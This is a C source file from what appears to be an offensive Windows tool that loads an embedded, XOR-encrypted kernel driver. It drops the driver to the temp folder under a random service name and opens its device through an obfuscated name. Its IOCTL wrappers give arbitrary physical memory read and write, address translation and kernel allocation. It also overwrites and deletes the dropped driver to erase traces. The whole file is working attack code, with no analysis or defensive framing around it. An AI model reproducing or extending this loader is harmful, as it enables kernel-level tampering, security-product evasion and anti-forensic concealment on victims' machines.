/* безликий */
#include "tbt.h"
#include "tbt_sys.h"
#include "xor.h"
#include "crypt.h"
#include "log.h"
#include <stdio.h>
#include <string.h>
#include <intrin.h>

static void random_name(char *out, uint32_t len)
{
    uint64_t seed = __rdtsc();
    for (uint32_t i = 0; i < len; i++) {
        seed   = seed * 6364136223846793005ULL + 1442695040888963407ULL;
        out[i] = 'A' + ((seed >> 32) % 26);
    }
    out[len] = 0;
}

static Result zv_ioctl(ZvCtx *ctx, DWORD code, void *in, DWORD in_sz, void *out,
                       DWORD out_sz, DWORD *bytes_ret)
{
    DWORD returned = 0;
    BOOL ok = DeviceIoControl(ctx->device, code, in, in_sz, out, out_sz, &returned, NULL);
    ctx->ioctl_count++;
    if (!ok) return ERR(STATUS_ERR_IOCTL_FAILED, EMSG("ioctl failed"));
    if (bytes_ret) *bytes_ret = returned;
    return OK_VOID;
}

static void secure_delete_file(const char *path, size_t file_size)
{
    FILE *wf = fopen(path, "wb");
    if (wf) {
        uint8_t junk[4096];
        uint64_t s = __rdtsc();
        for (uint32_t i = 0; i < sizeof(junk); i++) {
            s       = s * 6364136223846793005ULL + 1;
            junk[i] = (uint8_t)(s >> 32);
        }
        size_t written = 0;
        while (written < file_size) {
            size_t chunk = file_size - written;
            if (chunk > sizeof(junk)) chunk = sizeof(junk);
            fwrite(junk, 1, chunk, wf);
            written += chunk;
        }
        fclose(wf);
    }
    DeleteFileA(path);
}

Result Zv_Init(ZvCtx *ctx)
{
    memset(ctx, 0, sizeof(*ctx));

    char svc_name[12];
    random_name(svc_name, 8);

    char tmp_dir[MAX_PATH];
    GetTempPathA(sizeof(tmp_dir), tmp_dir);
    snprintf(ctx->tmp_path, sizeof(ctx->tmp_path), "%s%s.sys", tmp_dir, svc_name);

    uint8_t *decrypted = xor_decrypt(tbt_sys_data, tbt_sys_size);
    if (!decrypted) return ERR(STATUS_ERR_DRIVER_DROP, EMSG("decrypt failed"));

    FILE *f = fopen(ctx->tmp_path, "wb");
    if (!f) {
        free(decrypted);
        return ERR(STATUS_ERR_DRIVER_DROP, EMSG("fopen failed"));
    }
    fwrite(decrypted, 1, tbt_sys_size, f);
    fclose(f);
    memset(decrypted, 0, tbt_sys_size);
    free(decrypted);

    Result r = Io_CreateAndStart(&ctx->svc, svc_name, ctx->tmp_path);
    if (IS_ERR(r)) {
        secure_delete_file(ctx->tmp_path, tbt_sys_size);
        return r;
    }

    static const char xs_dev[] = {0x1F, 0x0E, 0x0A, 0x08, 0x08, 0x0E, 0x18, 0x18};
    char dev_name[12];
    xs_dec(dev_name, xs_dev, 8);
    char dev_path[32];
    snprintf(dev_path, sizeof(dev_path), "\\\\.\\%s", dev_name);

    ctx->device = CreateFileA(dev_path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (ctx->device == INVALID_HANDLE_VALUE) {
        Io_StopAndDelete(&ctx->svc);
        secure_delete_file(ctx->tmp_path, tbt_sys_size);
        return ERR(STATUS_ERR_DEVICE_OPEN, EMSG("device open failed"));
    }

    return OK_VOID;
}

Result Zv_Cleanup(ZvCtx *ctx)
{
    if (ctx->device && ctx->device != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx->device);
        ctx->device = NULL;
    }
    Io_StopAndDelete(&ctx->svc);
    secure_delete_file(ctx->tmp_path, tbt_sys_size);
    LOG_INF("Zv: %u IOCTLs issued", ctx->ioctl_count);
    return OK_VOID;
}

Result Zv_PhysRead(ZvCtx *ctx, PhysAddr pa, void *buf, uint32_t size)
{
    if (size <= 4096) {
        uint8_t stack_buf[4096 + 9];
        *(uint64_t *)(stack_buf + 0) = pa;
        *(uint8_t *)(stack_buf + 8)  = 1;
        DWORD ret                    = 0;
        TRY(zv_ioctl(ctx, ZV_IOCTL_PHYS_READ, stack_buf, 9, stack_buf, size, &ret));
        memcpy(buf, stack_buf, size);
        return OK_VOID;
    }

    uint8_t *iobuf = (uint8_t *)calloc(1, size);
    if (!iobuf) return ERR(STATUS_ERR_ALLOC_FAILED, EMSG("read alloc"));

    *(uint64_t *)(iobuf + 0) = pa;
    *(uint8_t *)(iobuf + 8)  = 1;

    DWORD ret = 0;
    Result r  = zv_ioctl(ctx, ZV_IOCTL_PHYS_READ, iobuf, 9, iobuf, size, &ret);
    if (IS_OK(r)) memcpy(buf, iobuf, size);
    free(iobuf);
    return r;
}

Result Zv_PhysWrite(ZvCtx *ctx, PhysAddr pa, const void *buf, uint32_t size)
{
    uint32_t in_size = 13 + size;

    if (in_size <= 4096) {
        uint8_t stack_buf[4096];
        *(uint64_t *)(stack_buf + 0) = pa;
        *(uint8_t *)(stack_buf + 8)  = 1;
        *(uint32_t *)(stack_buf + 9) = size;
        memcpy(stack_buf + 13, buf, size);
        return zv_ioctl(ctx, ZV_IOCTL_PHYS_WRITE, stack_buf, in_size, NULL, 0, NULL);
    }

    uint8_t *in = (uint8_t *)calloc(1, in_size);
    if (!in) return ERR(STATUS_ERR_ALLOC_FAILED, EMSG("write alloc"));

    *(uint64_t *)(in + 0) = pa;
    *(uint8_t *)(in + 8)  = 1;
    *(uint32_t *)(in + 9) = size;
    memcpy(in + 13, buf, size);

    Result r = zv_ioctl(ctx, ZV_IOCTL_PHYS_WRITE, in, in_size, NULL, 0, NULL);
    free(in);
    return r;
}

Result Zv_VirtToPhys(ZvCtx *ctx, VirtAddr va, PhysAddr *pa)
{
    uint64_t buf = va;
    DWORD ret    = 0;
    TRY(zv_ioctl(ctx, ZV_IOCTL_VIRT_TO_PHYS, &buf, 8, &buf, 8, &ret));
    if (buf == 0) return ERR(STATUS_ERR_VIRT_TO_PHYS, EMSG("VA→PA returned 0"));
    *pa = buf;
    return OK_VOID;
}

Result Zv_AllocContig(ZvCtx *ctx, uint32_t size, VirtAddr *va, PhysAddr *pa)
{
    uint8_t buf[16]        = {0};
    *(uint32_t *)(buf + 0) = size;
    *(uint64_t *)(buf + 4) = 0xFFFFFFFFFFFFFFFFULL;

    DWORD ret = 0;
    TRY(zv_ioctl(ctx, ZV_IOCTL_ALLOC_CONTIG, buf, 12, buf, 16, &ret));

    *pa = *(uint64_t *)(buf + 0);
    *va = *(uint64_t *)(buf + 8);
    if (*va == 0) return ERR(STATUS_ERR_ALLOC_FAILED, EMSG("contig alloc returned NULL"));
    return OK_VOID;
}

Result Zv_FreeContig(ZvCtx *ctx, VirtAddr va)
{
    uint8_t buf[16]        = {0};
    *(uint64_t *)(buf + 8) = va;
    return zv_ioctl(ctx, ZV_IOCTL_FREE_CONTIG, buf, 16, NULL, 0, NULL);
}
